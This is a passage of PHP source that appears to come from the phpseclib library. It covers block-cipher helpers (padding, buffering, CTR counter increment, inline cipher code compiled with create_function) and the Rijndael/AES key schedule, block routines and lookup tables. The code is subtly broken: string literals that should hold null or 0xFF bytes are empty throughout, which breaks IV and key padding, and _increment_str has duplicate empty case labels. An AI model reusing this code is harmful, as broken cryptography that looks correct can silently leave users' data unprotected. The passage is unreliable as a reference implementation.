            static $mcrypt_modes = array(CRYPT_MODE_CTR => 'ctr', CRYPT_MODE_ECB => MCRYPT_MODE_ECB, CRYPT_MODE_CBC => MCRYPT_MODE_CBC, CRYPT_MODE_CFB => 'ncfb', CRYPT_MODE_OFB => MCRYPT_MODE_NOFB, CRYPT_MODE_STREAM => MCRYPT_MODE_STREAM,);
            $this->demcrypt = @mcrypt_module_open($this->cipher_name_mcrypt, '', $mcrypt_modes[$this->mode], '');
            $this->enmcrypt = @mcrypt_module_open($this->cipher_name_mcrypt, '', $mcrypt_modes[$this->mode], '');
            if ($this->mode == CRYPT_MODE_CFB) {
                $this->ecb = @mcrypt_module_open($this->cipher_name_mcrypt, '', MCRYPT_MODE_ECB, '');
            }
        }
        if ($this->mode == CRYPT_MODE_CFB) {
            @mcrypt_generic_init($this->ecb, $this->key, str_repeat("", $this->block_size));
        }
    }
    function _pad($text) {
        $length = strlen($text);
        if (!$this->padding) {
            if ($length % $this->block_size == 0) {
                return $text;
            } else {
                user_error("The plaintext's length ($length) is not a multiple of the block size ({$this->block_size})");
                $this->padding = true;
            }
        }
        $pad = $this->block_size - ($length % $this->block_size);
        return str_pad($text, $length + $pad, chr($pad));
    }
    function _unpad($text) {
        if (!$this->padding) {
            return $text;
        }
        $length = ord($text[strlen($text) - 1]);
        if (!$length || $length > $this->block_size) {
            return false;
        }
        return substr($text, 0, -$length);
    }
    function _clearBuffers() {
        $this->enbuffer = $this->debuffer = array('ciphertext' => '', 'xor' => '', 'pos' => 0, 'enmcrypt_init' => true);
        $this->encryptIV = $this->decryptIV = str_pad(substr($this->iv, 0, $this->block_size), $this->block_size, "");
        if (!$this->skip_key_adjustment) {
            $this->key = str_pad(substr($this->key, 0, $this->key_length), $this->key_length, "");
        }
    }
    function _string_shift(&$string, $index = 1) {
        $substr = substr($string, 0, $index);
        $string = substr($string, $index);
        return $substr;
    }
    function _string_pop(&$string, $index = 1) {
        $substr = substr($string, -$index);
        $string = substr($string, 0, -$index);
        return $substr;
    }
    function _increment_str(&$var) {
        for ($i = 4;$i <= strlen($var);$i+= 4) {
            $temp = substr($var, -$i, 4);
            switch ($temp) {
                case "":
                    $var = substr_replace($var, "", -$i, 4);
                break;
                case "":
                    $var = substr_replace($var, "", -$i, 4);
                    return;
                default:
                    $temp = unpack('Nnum', $temp);
                    $var = substr_replace($var, pack('N', $temp['num'] + 1), -$i, 4);
                    return;
            }
        }
        $remainder = strlen($var) % 4;
        if ($remainder == 0) {
            return;
        }
        $temp = unpack('Nnum', str_pad(substr($var, 0, $remainder), 4, "", STR_PAD_LEFT));
        $temp = substr(pack('N', $temp['num'] + 1), -$remainder);
        $var = substr_replace($var, $temp, 0, $remainder);
    }
    function _setupInlineCrypt() {
        $this->use_inline_crypt = false;
    }
    function _createInlineCryptFunction($cipher_code) {
        $block_size = $this->block_size;
        $init_crypt = isset($cipher_code['init_crypt']) ? $cipher_code['init_crypt'] : '';
        $init_encrypt = isset($cipher_code['init_encrypt']) ? $cipher_code['init_encrypt'] : '';
        $init_decrypt = isset($cipher_code['init_decrypt']) ? $cipher_code['init_decrypt'] : '';
        $encrypt_block = $cipher_code['encrypt_block'];
        $decrypt_block = $cipher_code['decrypt_block'];
        switch ($this->mode) {
            case CRYPT_MODE_ECB:
                $encrypt = $init_encrypt . ' $_ciphertext = ""; $_plaintext_len = strlen($_text); for ($_i = 0; $_i < $_plaintext_len; $_i+= ' . $block_size . ') { $in = substr($_text, $_i, ' . $block_size . '); ' . $encrypt_block . ' $_ciphertext.= $in; } return $_ciphertext; ';
                $decrypt = $init_decrypt . ' $_plaintext = ""; $_text = str_pad($_text, strlen($_text) + (' . $block_size . ' - strlen($_text) % ' . $block_size . ') % ' . $block_size . ', chr(0)); $_ciphertext_len = strlen($_text); for ($_i = 0; $_i < $_ciphertext_len; $_i+= ' . $block_size . ') { $in = substr($_text, $_i, ' . $block_size . '); ' . $decrypt_block . ' $_plaintext.= $in; } return $self->_unpad($_plaintext); ';
            break;
            case CRYPT_MODE_CTR:
                $encrypt = $init_encrypt . ' $_ciphertext = ""; $_plaintext_len = strlen($_text); $_xor = $self->encryptIV; $_buffer = &$self->enbuffer; if (strlen($_buffer["ciphertext"])) { for ($_i = 0; $_i < $_plaintext_len; $_i+= ' . $block_size . ') { $_block = substr($_text, $_i, ' . $block_size . '); if (strlen($_block) > strlen($_buffer["ciphertext"])) { $in = $_xor; ' . $encrypt_block . ' $self->_increment_str($_xor); $_buffer["ciphertext"].= $in; } $_key = $self->_string_shift($_buffer["ciphertext"], ' . $block_size . '); $_ciphertext.= $_block ^ $_key; } } else { for ($_i = 0; $_i < $_plaintext_len; $_i+= ' . $block_size . ') { $_block = substr($_text, $_i, ' . $block_size . '); $in = $_xor; ' . $encrypt_block . ' $self->_increment_str($_xor); $_key = $in; $_ciphertext.= $_block ^ $_key; } } if ($self->continuousBuffer) { $self->encryptIV = $_xor; if ($_start = $_plaintext_len % ' . $block_size . ') { $_buffer["ciphertext"] = substr($_key, $_start) . $_buffer["ciphertext"]; } } return $_ciphertext; ';
                $decrypt = $init_encrypt . ' $_plaintext = ""; $_ciphertext_len = strlen($_text); $_xor = $self->decryptIV; $_buffer = &$self->debuffer; if (strlen($_buffer["ciphertext"])) { for ($_i = 0; $_i < $_ciphertext_len; $_i+= ' . $block_size . ') { $_block = substr($_text, $_i, ' . $block_size . '); if (strlen($_block) > strlen($_buffer["ciphertext"])) { $in = $_xor; ' . $encrypt_block . ' $self->_increment_str($_xor); $_buffer["ciphertext"].= $in; } $_key = $self->_string_shift($_buffer["ciphertext"], ' . $block_size . '); $_plaintext.= $_block ^ $_key; } } else { for ($_i = 0; $_i < $_ciphertext_len; $_i+= ' . $block_size . ') { $_block = substr($_text, $_i, ' . $block_size . '); $in = $_xor; ' . $encrypt_block . ' $self->_increment_str($_xor); $_key = $in; $_plaintext.= $_block ^ $_key; } } if ($self->continuousBuffer) { $self->decryptIV = $_xor; if ($_start = $_ciphertext_len % ' . $block_size . ') { $_buffer["ciphertext"] = substr($_key, $_start) . $_buffer["ciphertext"]; } } return $_plaintext; ';
            break;
            case CRYPT_MODE_CFB:
                $encrypt = $init_encrypt . ' $_ciphertext = ""; $_buffer = &$self->enbuffer; if ($self->continuousBuffer) { $_iv = &$self->encryptIV; $_pos = &$_buffer["pos"]; } else { $_iv = $self->encryptIV; $_pos = 0; } $_len = strlen($_text); $_i = 0; if ($_pos) { $_orig_pos = $_pos; $_max = ' . $block_size . ' - $_pos; if ($_len >= $_max) { $_i = $_max; $_len-= $_max; $_pos = 0; } else { $_i = $_len; $_pos+= $_len; $_len = 0; } $_ciphertext = substr($_iv, $_orig_pos) ^ $_text; $_iv = substr_replace($_iv, $_ciphertext, $_orig_pos, $_i); } while ($_len >= ' . $block_size . ') { $in = $_iv; ' . $encrypt_block . '; $_iv = $in ^ substr($_text, $_i, ' . $block_size . '); $_ciphertext.= $_iv; $_len-= ' . $block_size . '; $_i+= ' . $block_size . '; } if ($_len) { $in = $_iv; ' . $encrypt_block . ' $_iv = $in; $_block = $_iv ^ substr($_text, $_i); $_iv = substr_replace($_iv, $_block, 0, $_len); $_ciphertext.= $_block; $_pos = $_len; } return $_ciphertext; ';
                $decrypt = $init_encrypt . ' $_plaintext = ""; $_buffer = &$self->debuffer; if ($self->continuousBuffer) { $_iv = &$self->decryptIV; $_pos = &$_buffer["pos"]; } else { $_iv = $self->decryptIV; $_pos = 0; } $_len = strlen($_text); $_i = 0; if ($_pos) { $_orig_pos = $_pos; $_max = ' . $block_size . ' - $_pos; if ($_len >= $_max) { $_i = $_max; $_len-= $_max; $_pos = 0; } else { $_i = $_len; $_pos+= $_len; $_len = 0; } $_plaintext = substr($_iv, $_orig_pos) ^ $_text; $_iv = substr_replace($_iv, substr($_text, 0, $_i), $_orig_pos, $_i); } while ($_len >= ' . $block_size . ') { $in = $_iv; ' . $encrypt_block . ' $_iv = $in; $cb = substr($_text, $_i, ' . $block_size . '); $_plaintext.= $_iv ^ $cb; $_iv = $cb; $_len-= ' . $block_size . '; $_i+= ' . $block_size . '; } if ($_len) { $in = $_iv; ' . $encrypt_block . ' $_iv = $in; $_plaintext.= $_iv ^ substr($_text, $_i); $_iv = substr_replace($_iv, substr($_text, $_i), 0, $_len); $_pos = $_len; } return $_plaintext; ';
            break;
            case CRYPT_MODE_OFB:
                $encrypt = $init_encrypt . ' $_ciphertext = ""; $_plaintext_len = strlen($_text); $_xor = $self->encryptIV; $_buffer = &$self->enbuffer; if (strlen($_buffer["xor"])) { for ($_i = 0; $_i < $_plaintext_len; $_i+= ' . $block_size . ') { $_block = substr($_text, $_i, ' . $block_size . '); if (strlen($_block) > strlen($_buffer["xor"])) { $in = $_xor; ' . $encrypt_block . ' $_xor = $in; $_buffer["xor"].= $_xor; } $_key = $self->_string_shift($_buffer["xor"], ' . $block_size . '); $_ciphertext.= $_block ^ $_key; } } else { for ($_i = 0; $_i < $_plaintext_len; $_i+= ' . $block_size . ') { $in = $_xor; ' . $encrypt_block . ' $_xor = $in; $_ciphertext.= substr($_text, $_i, ' . $block_size . ') ^ $_xor; } $_key = $_xor; } if ($self->continuousBuffer) { $self->encryptIV = $_xor; if ($_start = $_plaintext_len % ' . $block_size . ') { $_buffer["xor"] = substr($_key, $_start) . $_buffer["xor"]; } } return $_ciphertext; ';
                $decrypt = $init_encrypt . ' $_plaintext = ""; $_ciphertext_len = strlen($_text); $_xor = $self->decryptIV; $_buffer = &$self->debuffer; if (strlen($_buffer["xor"])) { for ($_i = 0; $_i < $_ciphertext_len; $_i+= ' . $block_size . ') { $_block = substr($_text, $_i, ' . $block_size . '); if (strlen($_block) > strlen($_buffer["xor"])) { $in = $_xor; ' . $encrypt_block . ' $_xor = $in; $_buffer["xor"].= $_xor; } $_key = $self->_string_shift($_buffer["xor"], ' . $block_size . '); $_plaintext.= $_block ^ $_key; } } else { for ($_i = 0; $_i < $_ciphertext_len; $_i+= ' . $block_size . ') { $in = $_xor; ' . $encrypt_block . ' $_xor = $in; $_plaintext.= substr($_text, $_i, ' . $block_size . ') ^ $_xor; } $_key = $_xor; } if ($self->continuousBuffer) { $self->decryptIV = $_xor; if ($_start = $_ciphertext_len % ' . $block_size . ') { $_buffer["xor"] = substr($_key, $_start) . $_buffer["xor"]; } } return $_plaintext; ';
            break;
            case CRYPT_MODE_STREAM:
                $encrypt = $init_encrypt . ' $_ciphertext = ""; ' . $encrypt_block . ' return $_ciphertext; ';
                $decrypt = $init_decrypt . ' $_plaintext = ""; ' . $decrypt_block . ' return $_plaintext; ';
            break;
            default:
                $encrypt = $init_encrypt . ' $_ciphertext = ""; $_plaintext_len = strlen($_text); $in = $self->encryptIV; for ($_i = 0; $_i < $_plaintext_len; $_i+= ' . $block_size . ') { $in = substr($_text, $_i, ' . $block_size . ') ^ $in; ' . $encrypt_block . ' $_ciphertext.= $in; } if ($self->continuousBuffer) { $self->encryptIV = $in; } return $_ciphertext; ';
                $decrypt = $init_decrypt . ' $_plaintext = ""; $_text = str_pad($_text, strlen($_text) + (' . $block_size . ' - strlen($_text) % ' . $block_size . ') % ' . $block_size . ', chr(0)); $_ciphertext_len = strlen($_text); $_iv = $self->decryptIV; for ($_i = 0; $_i < $_ciphertext_len; $_i+= ' . $block_size . ') { $in = $_block = substr($_text, $_i, ' . $block_size . '); ' . $decrypt_block . ' $_plaintext.= $in ^ $_iv; $_iv = $_block; } if ($self->continuousBuffer) { $self->decryptIV = $_iv; } return $self->_unpad($_plaintext); ';
            break;
        }
        return create_function('$_action, &$self, $_text', $init_crypt . 'if ($_action == "encrypt") { ' . $encrypt . ' } else { ' . $decrypt . ' }');
    }
    function &_getLambdaFunctions() {
        static $functions = array();
        return $functions;
    }
    function _hashInlineCryptFunction($bytes) {
        if (!defined('CRYPT_BASE_WHIRLPOOL_AVAILABLE')) {
            define('CRYPT_BASE_WHIRLPOOL_AVAILABLE', (bool)(extension_loaded('hash') && in_array('whirlpool', hash_algos())));
        }
        $result = '';
        $hash = $bytes;
        switch (true) {
            case CRYPT_BASE_WHIRLPOOL_AVAILABLE:
                foreach (str_split($bytes, 64) as $t) {
                    $hash = hash('whirlpool', $hash, true);
                    $result.= $t ^ $hash;
                }
                return $result . hash('whirlpool', $hash, true);
            default:
                $len = strlen($bytes);
                for ($i = 0;$i < $len;$i+= 20) {
                    $t = substr($bytes, $i, 20);
                    $hash = pack('H*', sha1($hash));
                    $result.= $t ^ $hash;
                }
                return $result . pack('H*', sha1($hash));
        }
    }
}
define('CRYPT_RIJNDAEL_MODE_CTR', CRYPT_MODE_CTR);
define('CRYPT_RIJNDAEL_MODE_ECB', CRYPT_MODE_ECB);
define('CRYPT_RIJNDAEL_MODE_CBC', CRYPT_MODE_CBC);
define('CRYPT_RIJNDAEL_MODE_CFB', CRYPT_MODE_CFB);
define('CRYPT_RIJNDAEL_MODE_OFB', CRYPT_MODE_OFB);
class Crypt_Rijndael extends Crypt_Base {
    var $const_namespace = 'RIJNDAEL';
    var $cipher_name_mcrypt = 'rijndael-128';
    var $password_default_salt = 'phpseclib';
    var $w;
    var $dw;
    var $Nb = 4;
    var $key_length = 16;
    var $Nk = 4;
    var $Nr;
    var $c;
    var $kl;
    function setKey($key) {
        if (!$this->explicit_key_length) {
            $length = strlen($key);
            switch (true) {
                case $length <= 16:
                    $this->key_size = 16;
                break;
                case $length <= 20:
                    $this->key_size = 20;
                break;
                case $length <= 24:
                    $this->key_size = 24;
                break;
                case $length <= 28:
                    $this->key_size = 28;
                break;
                default:
                    $this->key_size = 32;
            }
        }
        parent::setKey($key);
    }
    function setKeyLength($length) {
        switch (true) {
            case $length <= 128:
                $this->key_length = 16;
            break;
            case $length <= 160:
                $this->key_length = 20;
            break;
            case $length <= 192:
                $this->key_length = 24;
            break;
            case $length <= 224:
                $this->key_length = 28;
            break;
            default:
                $this->key_length = 32;
        }
        parent::setKeyLength($length);
    }
    function setBlockLength($length) {
        $length >>= 5;
        if ($length > 8) {
            $length = 8;
        } elseif ($length < 4) {
            $length = 4;
        }
        $this->Nb = $length;
        $this->block_size = $length << 2;
        $this->changed = true;
        $this->_setEngine();
    }
    function isValidEngine($engine) {
        switch ($engine) {
            case CRYPT_ENGINE_OPENSSL:
                if ($this->block_size != 16) {
                    return false;
                }
                $this->cipher_name_openssl_ecb = 'aes-' . ($this->key_length << 3) . '-ecb';
                $this->cipher_name_openssl = 'aes-' . ($this->key_length << 3) . '-' . $this->_openssl_translate_mode();
            break;
            case CRYPT_ENGINE_MCRYPT:
                $this->cipher_name_mcrypt = 'rijndael-' . ($this->block_size << 3);
                if ($this->key_length % 8) {
                    return false;
                }
        }
        return parent::isValidEngine($engine);
    }
    function _encryptBlock($in) {
        static $tables;
        if (empty($tables)) {
            $tables = & $this->_getTables();
        }
        $t0 = $tables[0];
        $t1 = $tables[1];
        $t2 = $tables[2];
        $t3 = $tables[3];
        $sbox = $tables[4];
        $state = array();
        $words = unpack('N*', $in);
        $c = $this->c;
        $w = $this->w;
        $Nb = $this->Nb;
        $Nr = $this->Nr;
        $wc = $Nb - 1;
        foreach ($words as $word) {
            $state[] = $word ^ $w[++$wc];
        }
        $temp = array();
        for ($round = 1;$round < $Nr;++$round) {
            $i = 0;
            $j = $c[1];
            $k = $c[2];
            $l = $c[3];
            while ($i < $Nb) {
                $temp[$i] = $t0[$state[$i] >> 24 & 0x000000FF] ^ $t1[$state[$j] >> 16 & 0x000000FF] ^ $t2[$state[$k] >> 8 & 0x000000FF] ^ $t3[$state[$l] & 0x000000FF] ^ $w[++$wc];
                ++$i;
                $j = ($j + 1) % $Nb;
                $k = ($k + 1) % $Nb;
                $l = ($l + 1) % $Nb;
            }
            $state = $temp;
        }
        for ($i = 0;$i < $Nb;++$i) {
            $state[$i] = $sbox[$state[$i] & 0x000000FF] | ($sbox[$state[$i] >> 8 & 0x000000FF] << 8) | ($sbox[$state[$i] >> 16 & 0x000000FF] << 16) | ($sbox[$state[$i] >> 24 & 0x000000FF] << 24);
        }
        $i = 0;
        $j = $c[1];
        $k = $c[2];
        $l = $c[3];
        while ($i < $Nb) {
            $temp[$i] = ($state[$i] & 0xFF000000) ^ ($state[$j] & 0x00FF0000) ^ ($state[$k] & 0x0000FF00) ^ ($state[$l] & 0x000000FF) ^ $w[$i];
            ++$i;
            $j = ($j + 1) % $Nb;
            $k = ($k + 1) % $Nb;
            $l = ($l + 1) % $Nb;
        }
        switch ($Nb) {
            case 8:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3], $temp[4], $temp[5], $temp[6], $temp[7]);
            case 7:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3], $temp[4], $temp[5], $temp[6]);
            case 6:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3], $temp[4], $temp[5]);
            case 5:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3], $temp[4]);
            default:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3]);
        }
    }
    function _decryptBlock($in) {
        static $invtables;
        if (empty($invtables)) {
            $invtables = & $this->_getInvTables();
        }
        $dt0 = $invtables[0];
        $dt1 = $invtables[1];
        $dt2 = $invtables[2];
        $dt3 = $invtables[3];
        $isbox = $invtables[4];
        $state = array();
        $words = unpack('N*', $in);
        $c = $this->c;
        $dw = $this->dw;
        $Nb = $this->Nb;
        $Nr = $this->Nr;
        $wc = $Nb - 1;
        foreach ($words as $word) {
            $state[] = $word ^ $dw[++$wc];
        }
        $temp = array();
        for ($round = $Nr - 1;$round > 0;--$round) {
            $i = 0;
            $j = $Nb - $c[1];
            $k = $Nb - $c[2];
            $l = $Nb - $c[3];
            while ($i < $Nb) {
                $temp[$i] = $dt0[$state[$i] >> 24 & 0x000000FF] ^ $dt1[$state[$j] >> 16 & 0x000000FF] ^ $dt2[$state[$k] >> 8 & 0x000000FF] ^ $dt3[$state[$l] & 0x000000FF] ^ $dw[++$wc];
                ++$i;
                $j = ($j + 1) % $Nb;
                $k = ($k + 1) % $Nb;
                $l = ($l + 1) % $Nb;
            }
            $state = $temp;
        }
        $i = 0;
        $j = $Nb - $c[1];
        $k = $Nb - $c[2];
        $l = $Nb - $c[3];
        while ($i < $Nb) {
            $word = ($state[$i] & 0xFF000000) | ($state[$j] & 0x00FF0000) | ($state[$k] & 0x0000FF00) | ($state[$l] & 0x000000FF);
            $temp[$i] = $dw[$i] ^ ($isbox[$word & 0x000000FF] | ($isbox[$word >> 8 & 0x000000FF] << 8) | ($isbox[$word >> 16 & 0x000000FF] << 16) | ($isbox[$word >> 24 & 0x000000FF] << 24));
            ++$i;
            $j = ($j + 1) % $Nb;
            $k = ($k + 1) % $Nb;
            $l = ($l + 1) % $Nb;
        }
        switch ($Nb) {
            case 8:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3], $temp[4], $temp[5], $temp[6], $temp[7]);
            case 7:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3], $temp[4], $temp[5], $temp[6]);
            case 6:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3], $temp[4], $temp[5]);
            case 5:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3], $temp[4]);
            default:
                return pack('N*', $temp[0], $temp[1], $temp[2], $temp[3]);
        }
    }
    function _setupKey() {
        static $rcon = array(0, 0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000, 0x6C000000, 0xD8000000, 0xAB000000, 0x4D000000, 0x9A000000, 0x2F000000, 0x5E000000, 0xBC000000, 0x63000000, 0xC6000000, 0x97000000, 0x35000000, 0x6A000000, 0xD4000000, 0xB3000000, 0x7D000000, 0xFA000000, 0xEF000000, 0xC5000000, 0x91000000);
        if (isset($this->kl['key']) && $this->key === $this->kl['key'] && $this->key_length === $this->kl['key_length'] && $this->block_size === $this->kl['block_size']) {
            return;
        }
        $this->kl = array('key' => $this->key, 'key_length' => $this->key_length, 'block_size' => $this->block_size);
        $this->Nk = $this->key_length >> 2;
        $this->Nr = max($this->Nk, $this->Nb) + 6;
        switch ($this->Nb) {
            case 4:
            case 5:
            case 6:
                $this->c = array(0, 1, 2, 3);
            break;
            case 7:
                $this->c = array(0, 1, 2, 4);
            break;
            case 8:
                $this->c = array(0, 1, 3, 4);
        }
        $w = array_values(unpack('N*words', $this->key));
        $length = $this->Nb * ($this->Nr + 1);
        for ($i = $this->Nk;$i < $length;$i++) {
            $temp = $w[$i - 1];
            if ($i % $this->Nk == 0) {
                $temp = (($temp << 8) & 0xFFFFFF00) | (($temp >> 24) & 0x000000FF);
                $temp = $this->_subWord($temp) ^ $rcon[$i / $this->Nk];
            } elseif ($this->Nk > 6 && $i % $this->Nk == 4) {
                $temp = $this->_subWord($temp);
            }
            $w[$i] = $w[$i - $this->Nk] ^ $temp;
        }
        list($dt0, $dt1, $dt2, $dt3) = $this->_getInvTables();
        $temp = $this->w = $this->dw = array();
        for ($i = $row = $col = 0;$i < $length;$i++, $col++) {
            if ($col == $this->Nb) {
                if ($row == 0) {
                    $this->dw[0] = $this->w[0];
                } else {
                    $j = 0;
                    while ($j < $this->Nb) {
                        $dw = $this->_subWord($this->w[$row][$j]);
                        $temp[$j] = $dt0[$dw >> 24 & 0x000000FF] ^ $dt1[$dw >> 16 & 0x000000FF] ^ $dt2[$dw >> 8 & 0x000000FF] ^ $dt3[$dw & 0x000000FF];
                        $j++;
                    }
                    $this->dw[$row] = $temp;
                }
                $col = 0;
                $row++;
            }
            $this->w[$row][$col] = $w[$i];
        }
        $this->dw[$row] = $this->w[$row];
        $this->dw = array_reverse($this->dw);
        $w = array_pop($this->w);
        $dw = array_pop($this->dw);
        foreach ($this->w as $r => $wr) {
            foreach ($wr as $c => $wc) {
                $w[] = $wc;
                $dw[] = $this->dw[$r][$c];
            }
        }
        $this->w = $w;
        $this->dw = $dw;
    }
    function _subWord($word) {
        static $sbox;
        if (empty($sbox)) {
            list(,,,, $sbox) = $this->_getTables();
        }
        return $sbox[$word & 0x000000FF] | ($sbox[$word >> 8 & 0x000000FF] << 8) | ($sbox[$word >> 16 & 0x000000FF] << 16) | ($sbox[$word >> 24 & 0x000000FF] << 24);
    }
    function &_getTables() {
        static $tables;
        if (empty($tables)) {
            $t3 = array_map('intval', array(0x6363A5C6, 0x7C7C84F8, 0x777799EE, 0x7B7B8DF6, 0xF2F20DFF, 0x6B6BBDD6, 0x6F6FB1DE, 0xC5C55491, 0x30305060, 0x01010302, 0x6767A9CE, 0x2B2B7D56, 0xFEFE19E7, 0xD7D762B5, 0xABABE64D, 0x76769AEC, 0xCACA458F, 0x82829D1F, 0xC9C94089, 0x7D7D87FA, 0xFAFA15EF, 0x5959EBB2, 0x4747C98E, 0xF0F00BFB, 0xADADEC41, 0xD4D467B3, 0xA2A2FD5F, 0xAFAFEA45, 0x9C9CBF23, 0xA4A4F753, 0x727296E4, 0xC0C05B9B, 0xB7B7C275, 0xFDFD1CE1, 0x9393AE3D, 0x26266A4C, 0x36365A6C, 0x3F3F417E, 0xF7F702F5, 0xCCCC4F83, 0x34345C68, 0xA5A5F451, 0xE5E534D1, 0xF1F108F9, 0x717193E2, 0xD8D873AB, 0x31315362, 0x15153F2A, 0x04040C08, 0xC7C75295, 0x23236546, 0xC3C35E9D, 0x18182830, 0x9696A137, 0x05050F0A, 0x9A9AB52F, 0x0707090E, 0x12123624, 0x80809B1B, 0xE2E23DDF, 0xEBEB26CD, 0x2727694E, 0xB2B2CD7F, 0x75759FEA, 0x09091B12, 0x83839E1D, 0x2C2C7458, 0x1A1A2E34, 0x1B1B2D36, 0x6E6EB2DC, 0x5A5AEEB4, 0xA0A0FB5B, 0x5252F6A4, 0x3B3B4D76, 0xD6D661B7, 0xB3B3CE7D, 0x29297B52, 0xE3E33EDD, 0x2F2F715E, 0x84849713, 0x5353F5A6, 0xD1D168B9, 0x00000000, 0xEDED2CC1, 0x20206040, 0xFCFC1FE3, 0xB1B1C879, 0x5B5BEDB6, 0x6A6ABED4, 0xCBCB468D, 0xBEBED967, 0x39394B72, 0x4A4ADE94, 0x4C4CD498, 0x5858E8B0, 0xCFCF4A85, 0xD0D06BBB, 0xEFEF2AC5, 0xAAAAE54F, 0xFBFB16ED, 0x4343C586, 0x4D4DD79A, 0x33335566, 0x85859411, 0x4545CF8A, 0xF9F910E9, 0x02020604, 0x7F7F81FE, 0x5050F0A0, 0x3C3C4478, 0x9F9FBA25, 0xA8A8E34B, 0x5151F3A2, 0xA3A3FE5D, 0x4040C080, 0x8F8F8A05, 0x9292AD3F, 0x9D9DBC21, 0x38384870, 0xF5F504F1, 0xBCBCDF63, 0xB6B6C177, 0xDADA75AF, 0x21216342, 0x10103020, 0xFFFF1AE5, 0xF3F30EFD, 0xD2D26DBF, 0xCDCD4C81, 0x0C0C1418, 0x13133526, 0xECEC2FC3, 0x5F5FE1BE, 0x9797A235, 0x4444CC88, 0x1717392E, 0xC4C45793, 0xA7A7F255, 0x7E7E82FC, 0x3D3D477A, 0x6464ACC8, 0x5D5DE7BA, 0x19192B32, 0x737395E6, 0x6060A0C0, 0x81819819, 0x4F4FD19E, 0xDCDC7FA3, 0x22226644, 0x2A2A7E54, 0x9090AB3B, 0x8888830B, 0x4646CA8C, 0xEEEE29C7, 0xB8B8D36B, 0x14143C28, 0xDEDE79A7, 0x5E5EE2BC, 0x0B0B1D16, 0xDBDB76AD, 0xE0E03BDB, 0x32325664, 0x3A3A4E74, 0x0A0A1E14, 0x4949DB92, 0x06060A0C, 0x24246C48, 0x5C5CE4B8, 0xC2C25D9F, 0xD3D36EBD, 0xACACEF43, 0x6262A6C4, 0x9191A839, 0x9595A431, 0xE4E437D3, 0x79798BF2, 0xE7E732D5, 0xC8C8438B, 0x3737596E, 0x6D6DB7DA, 0x8D8D8C01, 0xD5D564B1, 0x4E4ED29C, 0xA9A9E049, 0x6C6CB4D8, 0x5656FAAC, 0xF4F407F3, 0xEAEA25CF, 0x6565AFCA, 0x7A7A8EF4, 0xAEAEE947, 0x08081810, 0xBABAD56F, 0x787888F0, 0x25256F4A, 0x2E2E725C, 0x1C1C2438, 0xA6A6F157, 0xB4B4C773, 0xC6C65197, 0xE8E823CB, 0xDDDD7CA1, 0x74749CE8, 0x1F1F213E, 0x4B4BDD96, 0xBDBDDC61, 0x8B8B860D, 0x8A8A850F, 0x707090E0, 0x3E3E427C, 0xB5B5C471, 0x6666AACC, 0x4848D890, 0x03030506, 0xF6F601F7, 0x0E0E121C, 0x6161A3C2, 0x35355F6A, 0x5757F9AE, 0xB9B9D069, 0x86869117, 0xC1C15899, 0x1D1D273A, 0x9E9EB927, 0xE1E138D9, 0xF8F813EB, 0x9898B32B, 0x11113322, 0x6969BBD2, 0xD9D970A9, 0x8E8E8907, 0x9494A733, 0x9B9BB62D, 0x1E1E223C, 0x87879215, 0xE9E920C9, 0xCECE4987, 0x5555FFAA, 0x28287850, 0xDFDF7AA5, 0x8C8C8F03, 0xA1A1F859, 0x89898009, 0x0D0D171A, 0xBFBFDA65, 0xE6E631D7, 0x4242C684, 0x6868B8D0, 0x4141C382, 0x9999B029, 0x2D2D775A, 0x0F0F111E, 0xB0B0CB7B, 0x5454FCA8, 0xBBBBD66D, 0x16163A2C));
            foreach ($t3 as $t3i) {
                $t0[] = (($t3i << 24) & 0xFF000000) | (($t3i >> 8) & 0x00FFFFFF);
                $t1[] = (($t3i << 16) & 0xFFFF0000) | (($t3i >> 16) & 0x0000FFFF);
                $t2[] = (($t3i << 8) & 0xFFFFFF00) | (($t3i >> 24) & 0x000000FF);
            }
            $tables = array($t0, $t1, $t2, $t3, array(0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 